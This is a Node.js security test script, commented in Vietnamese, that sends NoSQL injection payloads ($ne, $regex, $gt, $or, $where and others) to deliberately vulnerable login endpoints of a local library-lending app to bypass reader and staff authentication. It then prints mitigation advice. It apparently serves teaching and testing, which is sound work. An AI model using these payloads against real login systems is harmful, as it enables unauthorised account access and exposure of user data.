// test-nosql-injection.js
// File test NoSQL Injection cho hệ thống Quản lý mượn sách

const axios = require("axios");

const API_BASE = "http://localhost:5000/api";

console.log("🚨 NoSQL Injection Test Suite - Quản Lý Mượn Sách");
console.log("================================================");

// Test cases for NoSQL injection
const testCases = [
  {
    name: "Bypass Authentication với $ne operator",
    description: "Sử dụng $ne để bypass authentication",
    readerPayload: {
      MaDocGia: { $ne: null },
      MatKhau: { $ne: null },
    },
    staffPayload: {
      TaiKhoan: { $ne: null },
      MatKhau: { $ne: null },
    },
  },
  {
    name: "Bypass Authentication với $exists operator",
    description: "Sử dụng $exists để tìm user có field tồn tại",
    readerPayload: {
      MaDocGia: { $exists: true },
      MatKhau: { $exists: true },
    },
    staffPayload: {
      TaiKhoan: { $exists: true },
      MatKhau: { $exists: true },
    },
  },
  {
    name: "Regex Injection",
    description: "Sử dụng regex để match bất kỳ giá trị nào",
    readerPayload: {
      MaDocGia: { $regex: ".*" },
      MatKhau: { $regex: ".*" },
    },
    staffPayload: {
      TaiKhoan: { $regex: ".*" },
      MatKhau: { $regex: ".*" },
    },
  },
  {
    name: "Greater Than Injection",
    description: "Sử dụng $gt để tìm user có giá trị lớn hơn empty string",
    readerPayload: {
      MaDocGia: { $gt: "" },
      MatKhau: { $gt: "" },
    },
    staffPayload: {
      TaiKhoan: { $gt: "" },
      MatKhau: { $gt: "" },
    },
  },
  {
    name: "OR Injection",
    description: "Sử dụng $or để bypass với nhiều điều kiện",
    readerPayload: {
      $or: [{ MaDocGia: { $exists: true } }, { Email: { $exists: true } }],
      MatKhau: { $ne: null },
    },
    staffPayload: {
      $or: [{ MSNV: { $exists: true } }, { HoTenNV: { $exists: true } }],
      MatKhau: { $ne: null },
    },
  },
];

async function testReaderLogin(payload, testName) {
  try {
    console.log(`\n🔍 Testing Reader Login: ${testName}`);
    console.log("Payload:", JSON.stringify(payload, null, 2));

    const response = await axios.post(
      `${API_BASE}/login-vulnerable/reader`,
      payload
    );

    console.log("✅ SUCCESS - NoSQL Injection worked!");
    console.log("User info:", {
      MaDocGia: response.data.user?.MaDocGia,
      HoTen: response.data.user?.HoTen,
      Email: response.data.user?.Email,
      hasToken: !!response.data.token,
    });
    return true;
  } catch (error) {
    console.log("❌ FAILED:", error.response?.data?.message || error.message);
    return false;
  }
}

async function testStaffLogin(payload, testName) {
  try {
    console.log(`\n🔍 Testing Staff Login: ${testName}`);
    console.log("Payload:", JSON.stringify(payload, null, 2));

    const response = await axios.post(
      `${API_BASE}/login-vulnerable/staff`,
      payload
    );

    console.log("✅ SUCCESS - NoSQL Injection worked!");
    console.log("User info:", {
      MSNV: response.data.user?.MSNV,
      HoTenNV: response.data.user?.HoTenNV,
      ChucVu: response.data.user?.ChucVu,
      Role: response.data.user?.role,
      hasToken: !!response.data.token,
    });
    return true;
  } catch (error) {
    console.log("❌ FAILED:", error.response?.data?.message || error.message);
    return false;
  }
}

async function runTests() {
  console.log("\n🎯 Bắt đầu test NoSQL Injection...\n");

  let readerSuccesses = 0;
  let staffSuccesses = 0;

  for (const testCase of testCases) {
    console.log(`\n${"=".repeat(60)}`);
    console.log(`📋 Test Case: ${testCase.name}`);
    console.log(`📝 Description: ${testCase.description}`);
    console.log(`${"=".repeat(60)}`);

    // Test reader login
    const readerSuccess = await testReaderLogin(
      testCase.readerPayload,
      `${testCase.name} - Reader`
    );
    if (readerSuccess) readerSuccesses++;

    // Test staff login
    const staffSuccess = await testStaffLogin(
      testCase.staffPayload,
      `${testCase.name} - Staff`
    );
    if (staffSuccess) staffSuccesses++;

    // Delay between tests
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }

  console.log("\n" + "=".repeat(60));
  console.log("📊 TEST RESULTS SUMMARY");
  console.log("=".repeat(60));
  console.log(
    `👥 Reader Login Tests: ${readerSuccesses}/${testCases.length} successful`
  );
  console.log(
    `👔 Staff Login Tests: ${staffSuccesses}/${testCases.length} successful`
  );
  console.log(
    `🎯 Total Success Rate: ${(
      ((readerSuccesses + staffSuccesses) / (testCases.length * 2)) *
      100
    ).toFixed(1)}%`
  );

  if (readerSuccesses > 0 || staffSuccesses > 0) {
    console.log("\n🚨 VULNERABILITY CONFIRMED!");
    console.log("   Application is vulnerable to NoSQL Injection attacks.");
    console.log("   Immediate action required to fix security issues.");
  } else {
    console.log("\n✅ NO VULNERABILITIES FOUND");
    console.log(
      "   Application appears to be secure against tested NoSQL injection payloads."
    );
  }
}

// Thêm một số test cases đặc biệt
async function testSpecialCases() {
  console.log("\n" + "=".repeat(60));
  console.log("🔬 SPECIAL TEST CASES");
  console.log("=".repeat(60));

  // Test 1: Empty object injection
  console.log("\n🧪 Test: Empty object injection");
  await testReaderLogin({ MaDocGia: {}, MatKhau: {} }, "Empty Object");

  // Test 2: JavaScript injection (if eval is used somewhere)
  console.log("\n🧪 Test: JavaScript code injection");
  await testReaderLogin(
    {
      MaDocGia: { $where: "this.MaDocGia != null" },
      MatKhau: { $where: "this.MatKhau != null" },
    },
    "JavaScript Where Clause"
  );

  // Test 3: Type confusion
  console.log("\n🧪 Test: Type confusion attack");
  await testReaderLogin(
    {
      MaDocGia: { $type: 2 }, // String type
      MatKhau: { $type: 2 },
    },
    "Type Confusion"
  );

  // Test 4: Array injection
  console.log("\n🧪 Test: Array injection");
  await testReaderLogin(
    {
      MaDocGia: { $in: [""] },
      MatKhau: { $nin: [null] },
    },
    "Array Injection"
  );
}

// Hàm để test với server có sẵn
async function checkServerStatus() {
  try {
    console.log("🔄 Checking server status...");
    await axios.get(`${API_BASE.replace("/api", "")}/`);
    console.log("✅ Server is running");
    return true;
  } catch (error) {
    console.log("❌ Server is not running or not accessible");
    console.log("Please start the backend server first:");
    console.log("  cd book-management-backend");
    console.log("  npm start");
    return false;
  }
}

// Main execution
async function main() {
  const serverRunning = await checkServerStatus();
  if (!serverRunning) {
    process.exit(1);
  }

  await runTests();
  await testSpecialCases();

  console.log("\n" + "=".repeat(60));
  console.log("🛡️  MITIGATION RECOMMENDATIONS");
  console.log("=".repeat(60));
  console.log("1. Always validate and sanitize user input");
  console.log("2. Use schema validation (e.g., Joi, express-validator)");
  console.log("3. Implement proper type checking");
  console.log("4. Use parameterized queries when possible");
  console.log("5. Apply the principle of least privilege");
  console.log("6. Implement proper authentication and authorization");
  console.log("7. Use bcrypt for password hashing");
  console.log("8. Add rate limiting and account lockout mechanisms");
}

// Export for use in other files
module.exports = {
  testReaderLogin,
  testStaffLogin,
  testCases,
};

// Run tests if called directly
if (require.main === module) {
  main().catch(console.error);
}
